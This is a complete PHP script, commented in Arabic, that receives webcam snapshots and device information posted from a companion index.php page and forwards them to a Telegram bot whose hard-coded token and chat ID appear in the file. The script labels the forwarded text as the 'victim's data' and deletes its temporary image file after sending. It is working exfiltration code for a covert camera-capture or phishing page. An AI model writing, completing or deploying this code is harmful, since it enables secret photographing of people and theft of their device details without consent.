<?php
// إعدادات البوت والبيانات الخاصة بك
$botToken = "8771622459:AAHTQLVU5fSRbP_gTZ4nFkqSKw2vyyHSlgM";
$chatId = "8504751121";

// 1. استقبال البيانات المرسلة من index.php
$imageData = isset($_POST['img']) ? $_POST['img'] : null;
$infoData = isset($_POST['info']) ? $_POST['info'] : "لا توجد معلومات إضافية";

// 2. إذا توفرت معلومات الجهاز، نقوم بإرسالها كنص أولاً
if (!empty($infoData)) {
    $textUrl = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId . "&text=" . urlencode("بيانات الضحية:\n" . $infoData);
    file_get_contents($textUrl);
}

// 3. معالجة وإرسال الصورة
if (!empty($imageData)) {
    // تنظيف البيانات وفك التشفير
    $filteredData = substr($imageData, strpos($imageData, ",")+1);
    $unencodedData = base64_decode($filteredData);
    
    // إنشاء ملف مؤقت باسم فريد
    $tempFileName = 'cam_' . time() . '_' . rand(1000,9999) . '.png';
    file_put_contents($tempFileName, $unencodedData);

    // رابط الإرسال إلى تلجرام
    $url = "https://api.telegram.org/bot" . $botToken . "/sendPhoto";

    // إعداد البيانات للإرسال
    $postFields = [
        'chat_id' => $chatId,
        'photo' => new CURLFile(realpath($tempFileName))
    ];

    // عملية الإرسال باستخدام CURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // الحذف الآمن للملف المؤقت بعد الإرسال
    if (file_exists($tempFileName)) {
        unlink($tempFileName);
    }
}
?>
